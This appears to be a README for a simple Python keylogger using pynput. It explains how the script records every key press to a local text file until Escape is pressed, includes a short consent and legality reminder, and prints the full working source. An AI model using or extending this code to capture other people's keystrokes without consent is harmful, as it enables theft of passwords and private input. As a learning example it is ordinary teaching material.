# Simple Keylogger

The provided script is a simple keylogger implemented in Python using the `pynput` library. It captures and logs all key presses, storing them in a text file named `keylogger.txt`. The program terminates when the **Escape** key (`Key.esc`) is pressed.

---

### **Features**  
1. **Key Logging**:  
   - Captures and records both printable and non-printable keys.  
2. **Log File**:  
   - Stores all keypress data in a file (`keylogger.txt`).  
3. **Exit Trigger**:  
   - Stops logging when the Escape key is pressed.

---

### **How It Works**  
1. **Key Press Detection**:  
   - The `on_press` event handler (`log_key`) captures each keypress.  
   - Printable characters (letters, numbers, symbols) are logged directly.  
   - Non-printable keys (e.g., Enter, Shift) are logged as `[key_name]`.  

2. **Logging**:  
   - The program appends each keypress to `keylogger.txt`.  
   - This ensures a continuous log of all user input until termination.  

3. **Stopping the Listener**:  
   - The `on_release` event handler (`stop_listener`) monitors for the Escape key.  
   - When pressed, it stops the listener, effectively ending the keylogging process.  

4. **Execution**:  
   - A `Listener` instance is created and managed with a context manager (`with Listener as listener`).  
   - The listener runs in the background, capturing events until explicitly stopped.

---

### **Technologies Used**  
1. **Python**:  
   - Core programming language for writing the script.  

2. **`pynput` Library**:  
   - Used to listen for keyboard events and interact with the system.  

3. **File Handling**:  
   - Appends data to a text file using Python's file I/O capabilities.  

---

### **Potential Use Cases**  
- Debugging keyboard inputs for testing applications.  
- Monitoring for specific key sequences in controlled environments.  

**Note**: Always ensure ethical and legal compliance when working with keylogging software. This type of script must only be used with proper consent and in accordance with local laws.

---

### **Code**  

Here is the Python code for the Simple Keylogger:
```
from pynput.keyboard import Key, Listener

# Path to the log file
log_file = "keylogger.txt"

def log_key(key):
    try:
        with open(log_file, "a") as file:
            file.write(key.char)
    except AttributeError:
        with open(log_file, "a") as file:
            file.write(f'[{key}]')

def stop_listener(key):
    if key == Key.esc:
        # Stop listener
        return False

# Start the listener
with Listener(on_press=log_key, on_release=stop_listener) as listener:
    listener.join()
